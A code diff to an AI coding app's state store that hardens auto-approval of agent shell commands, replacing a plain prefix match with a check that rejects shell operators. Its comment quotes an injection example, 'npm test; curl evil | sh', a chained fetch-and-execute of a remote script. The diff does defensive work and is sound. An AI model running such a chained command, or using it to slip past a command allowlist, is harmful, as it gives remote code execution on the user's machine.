@@ -1,6 +1,7 @@
 import { create } from 'zustand'
 import type { Attachment, ChatMessage, GitStatus, McpServerStatus, Mode, ProviderError, ProviderSummary, StreamEvent, WorkspaceTreeEntry } from '@shared/types'
 import { scanSecrets, type SecretCategory } from '@shared/secret-scan'
+import { commandMatchesAllowedPrefix } from '@shared/command-safety'
 import { encodeSelection } from '../canvas/selection.js'
 
 function newId(): string {
@@ -852,7 +853,9 @@ export const useAppStore = create<AppState>((set, get) => ({
       if (isCommand) {
         let command = ''
         try { command = String((JSON.parse(event.argsJson) as { command?: string }).command ?? '') } catch { /* keep '' */ }
-        if (get().allowedCommandPrefixes.some((p) => command.startsWith(p))) {
+        // Auto-run only a clean prefix match with no shell operators — an
+        // allowed "npm test" must not silently run "npm test; curl evil | sh".
+        if (commandMatchesAllowedPrefix(command, get().allowedCommandPrefixes)) {
           void window.openCoder.chat.toolDecision(event.callId, 'accept')
           return
         }
